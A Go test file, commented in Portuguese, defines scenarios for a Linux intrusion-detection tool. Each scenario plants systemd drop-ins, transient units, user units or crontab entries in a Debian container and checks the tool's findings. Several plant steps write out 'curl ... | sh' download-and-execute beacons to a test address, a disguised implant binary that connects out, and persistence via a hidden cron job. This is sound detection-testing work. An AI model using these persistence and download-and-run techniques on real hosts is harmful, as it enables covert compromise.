package scenario

// Cenários com a CONTRAPARTE LEGÍTIMA PRESENTE.
//
// A matriz de contêineres é magra, e o preço apareceu num defeito real. O
// cenário 71 planta um drop-in em `sshd.service` e roda em alpine, que tem ZERO
// unit systemd. A resolução de ator tinha um bug que só aparece quando a unit
// de verdade existe ao lado do drop-in — e nenhum cenário podia vê-lo, porque
// não havia unit de verdade em lugar nenhum:
//
//	alpine:3.20      0 units
//	debian:12       28
//	host real      421
//
// Um check validado só onde o legítimo está AUSENTE pode estar passando pelo
// motivo errado: acerta no cenário porque só há uma resposta possível, e erra
// no servidor porque lá há centenas.
//
// A primeira execução desta imagem, ainda LIMPA, já pagou o custo: um aviso em
// `/` num Debian de fábrica. O /etc/crontab que o pacote `cron` instala separa
// usuário e comando com TAB, o parser cortava em espaço, e o comando virava
// "/ && run-parts …". Todo servidor Debian com cron saía com exit code 1, e
// nenhum contêiner da matriz tem cron instalado para mostrar.

// servicos é a imagem construída por `make images`.
var servicos = []string{"aletheia-servicos:test"}

func init() {
	Register(Scenario{
		ID:   "J1-fabrica-com-servicos",
		Desc: "Debian com sshd, cron e rsyslog instalados e NADA plantado",
		// O cenário mais importante do arquivo, e é o que não planta nada.
		//
		// Estado de fábrica não é ataque. Um host com serviço de verdade tem
		// unit de verdade, crontab de verdade, chave de host de verdade e conta
		// de serviço de verdade — e nenhuma dessas coisas pode virar achado.
		//
		// É a versão com serviços do que a matriz já garante vazia, e mede o
		// que ela não conseguia medir: o ruído que só existe quando o host faz
		// alguma coisa.
		Images:         servicos,
		Plant:          `true`,
		Forbid:         []string{"integrity.no_package_owner"},
		MaxWarn:        SemAvisos,
		Exit:           0,
		MustBeComplete: true,
	})

	Register(Scenario{
		ID:   "J2-dropin-ao-lado-da-unit-de-verdade",
		Desc: "drop-in com implante numa unit que EXISTE, entregue por pacote",
		// A forma exata do defeito que originou este arquivo.
		//
		// No Debian a unit do openssh chama-se `ssh.service`, e o ExecStart dela
		// aponta para /usr/sbin/sshd — que tem dono de pacote e que ninguém
		// acusa. A resolução de ator precisa escolher, entre os executáveis da
		// unit, o que a ferramenta apontou por outro caminho; pegar o primeiro
		// devolvia o daemon legítimo e a correlação sumia em silêncio.
		Images:    servicos,
		Caps:      []string{"NET_ADMIN"},
		NoNetwork: true,
		Plant: `ip link set lo up
			ip addr add 198.51.100.241/32 dev lo
			mkdir -p /usr/local/sbin /etc/systemd/system/ssh.service.d
			cp /helper /usr/local/sbin/systemd-netlinkd
			/helper listen 198.51.100.241:8443 &
			sleep 0.4
			/usr/local/sbin/systemd-netlinkd connect 198.51.100.241:8443 &
			printf '[Service]\nExecStartPre=/usr/local/sbin/systemd-netlinkd sleep 1\n' > /etc/systemd/system/ssh.service.d/10-hardening.conf
			sleep 0.5`,
		Expect: []Expect{
			{ID: "persist.unit_dropin_exec", Sev: "WARN"},
			{ID: "integrity.no_package_owner", Subject: "/usr/local/sbin/systemd-netlinkd"},
			{ID: "net.egress_unowned"},
			// E um achado que SÓ existe porque a contraparte legítima está
			// presente: o ssh.socket ativa a unit que agora roda o implante, e
			// isso é um segundo caminho de execução para ele. Num contêiner sem
			// socket unit, este sinal não tinha como aparecer.
			{ID: "persist.unit_socket_unowned", Subject: "ssh.socket"},
		},
		// A unit do pacote está ao lado e NÃO pode ser acusada de nada.
		ForbidOutput: []string{"/usr/sbin/sshd"},
		// E os três sinais têm que chegar como UM alvo, com o nome do implante.
		ExpectOutput: []string{
			"/usr/local/sbin/systemd-netlinkd 3 sinais no mesmo alvo",
		},
		Exit:           1,
		MustBeComplete: true,
	})

	Register(Scenario{
		ID:   "J3-cron-de-invasor-entre-os-de-fabrica",
		Desc: "entrada de cron do invasor no meio do /etc/crontab de fábrica",
		// O invasor acrescenta uma linha ao arquivo que já tem quatro linhas
		// legítimas — que é como isso acontece de verdade. O check tem que achar
		// a dele e passar batido pelas outras quatro.
		Images: servicos,
		Plant: `mkdir -p /usr/local/bin
			cp /helper /usr/local/bin/.sysupdate
			printf '*/5 * * * *\troot\t/usr/local/bin/.sysupdate beacon\n' >> /etc/crontab
			true`,
		Expect: []Expect{
			{ID: "integrity.no_package_owner", Subject: "/usr/local/bin/.sysupdate"},
		},
		// As quatro linhas de fábrica citam `/` e `/etc/cron.hourly`: nenhuma
		// delas pode virar achado, e foi exatamente essa a regressão.
		ForbidOutput:   []string{"run-parts", " / "},
		MustBeComplete: true,
		Exit:           1,
	})
}

func init() {
	// P0 desta rodada, virado cenário: a precedência REAL do systemd. A unit
	// efêmera em /run/systemd/transient VENCE a de /etc/systemd/system de mesmo
	// nome. O implante põe o beacon (curl|sh) na transient e uma benigna em /etc.
	// Antes do conserto, a de /etc era marcada efetiva e a transient Shadowed —
	// o check de execução pulava o beacon (FN da unit ATIVA). Prova contra o
	// systemd de verdade, não contra a leitura do man page.
	Register(Scenario{
		ID:     "J4-transient-vence-etc",
		Desc:   "unit efêmera em /run/systemd/transient VENCE a de /etc de mesmo nome",
		Images: servicos,
		Plant: `mkdir -p /run/systemd/transient /etc/systemd/system
			printf '[Service]\nExecStart=/bin/true\n' > /etc/systemd/system/telemetry.service
			printf '[Service]\nExecStart=/bin/sh -c "curl -s http://198.51.100.9/p | sh"\n' > /run/systemd/transient/telemetry.service`,
		Expect: []Expect{
			{ID: "persist.unit_exec_suspect", Sev: "CRITICAL", Subject: "telemetry.service"},
		},
		Exit: 2,
	})
}

func init() {
	// #8 desta rodada, virado cenário: drop-in TYPE-WIDE. Um `service.d/` (sem
	// nome de unit) altera TODA .service — ssh, cron, rsyslog, todas as do
	// pacote. O implante põe um ExecStartPre que baixa e executa. Antes do
	// conserto, só o drop-in de NOME exato entrava, e o type-wide não afetava
	// unit nenhuma: FN. A imagem tem serviços de VERDADE para o padrão casar.
	Register(Scenario{
		ID:     "J5-dropin-type-wide",
		Desc:   "service.d/ (type-wide) com ExecStartPre malicioso atinge toda service",
		Images: servicos,
		Plant: `mkdir -p /etc/systemd/system/service.d
			printf '[Service]\nExecStartPre=/bin/sh -c "curl -s http://198.51.100.9/t | sh"\n' > /etc/systemd/system/service.d/50-global.conf`,
		Expect: []Expect{
			// Subject de uma service REAL: sem a expansão o achado sairia só
			// sobre o padrão "service", não sobre ssh.service. Exigir a service
			// concreta é o que prova que o type-wide alcançou a base.
			{ID: "persist.unit_exec_suspect", Sev: "CRITICAL", Subject: "ssh.service"},
		},
		Exit: 2,
	})
}

func init() {
	// #4 desta rodada, virado cenário: o ExecSearchPath de um DROP-IN resolve o
	// ExecStart de nome-nu da BASE. A base tem `ExecStart=payload` (nome nu, sem
	// searchpath próprio); o drop-in acrescenta ExecSearchPath=/tmp/.cache, e o
	// systemd roda /tmp/.cache/payload. Antes do conserto a base não via o
	// searchpath do drop-in, "payload" ficava nome nu (não-caminho) e o check de
	// execução não classificava nada — FN do bypass.
	Register(Scenario{
		ID:     "J6-execsearchpath-dropin",
		Desc:   "ExecSearchPath de drop-in resolve o ExecStart nu da base para /tmp",
		Images: servicos,
		Plant: `mkdir -p /etc/systemd/system/beacon.service.d /tmp/.cache
			printf '[Service]\nExecStart=payload --daemon\n' > /etc/systemd/system/beacon.service
			printf '[Service]\nExecSearchPath=/tmp/.cache\n' > /etc/systemd/system/beacon.service.d/10-path.conf
			printf '#!/bin/sh\nexit 0\n' > /tmp/.cache/payload
			chmod +x /tmp/.cache/payload`,
		Expect: []Expect{
			{ID: "persist.unit_exec_suspect", Sev: "CRITICAL", Subject: "beacon.service", Evidence: "/tmp/.cache/payload"},
		},
		Exit: 2,
	})
}

func init() {
	// #1 desta rodada, virado cenário: ExecStart de NOME NU, sem ExecSearchPath
	// e sem PATH próprio. O systemd resolve contra um PATH fixo (/usr/local/sbin,
	// /usr/sbin, …); o binário dropado em /usr/sbin — diretório de PACOTE — não
	// tem dono. Antes do conserto "synctool" ficava nome nu (sem "/"), a pergunta
	// de propriedade nem era feita e unit_unowned não se formava: FN. A imagem
	// tem dpkg, então "sem dono" é uma pergunta respondível.
	Register(Scenario{
		ID:     "J7-nome-nu-path-padrao",
		Desc:   "ExecStart de nome nu resolve contra o PATH fixo; binário sem-dono em /usr/sbin vira unit_unowned",
		Images: servicos,
		Plant: `printf '[Service]\nExecStart=synctool --daemon\n' > /etc/systemd/system/syncd.service
			printf '#!/bin/sh\nexit 0\n' > /usr/sbin/synctool
			chmod +x /usr/sbin/synctool`,
		Expect: []Expect{
			{ID: "persist.unit_unowned", Sev: "CRITICAL", Subject: "syncd.service", Evidence: "/usr/sbin/synctool"},
		},
		Exit: 2,
	})
}

func init() {
	// #5 desta rodada, virado cenário: DROP-IN de unit de USUÁRIO por-home. Um
	// ~/.config/systemd/user/beacon.service.d/ acrescenta um ExecStartPre que
	// baixa-e-executa — persistência que roda no login do usuário. Antes do
	// conserto o loop de user só via arquivos isUnitName (não recursava no .d/),
	// e o drop-in passava invisível: FN. O passwd ganha um usuário com home para
	// o laço de homes achar.
	Register(Scenario{
		ID:     "J8-dropin-user-por-home",
		Desc:   "drop-in em ~/.config/systemd/user/*.service.d/ com ExecStartPre malicioso é visto",
		Images: servicos,
		Plant: `echo 'appuser:x:1001:1001::/home/appuser:/bin/bash' >> /etc/passwd
			echo 'appuser:!:19000:0:99999:7:::' >> /etc/shadow
			mkdir -p /home/appuser/.config/systemd/user/beacon.service.d
			printf '[Service]\nExecStart=/usr/bin/true\n' > /home/appuser/.config/systemd/user/beacon.service
			printf '[Service]\nExecStartPre=/bin/sh -c "curl -s http://198.51.100.9/u | sh"\n' > /home/appuser/.config/systemd/user/beacon.service.d/10-x.conf`,
		Expect: []Expect{
			{ID: "persist.unit_exec_suspect", Sev: "CRITICAL", Subject: "beacon.service"},
		},
		Exit: 2,
	})
}
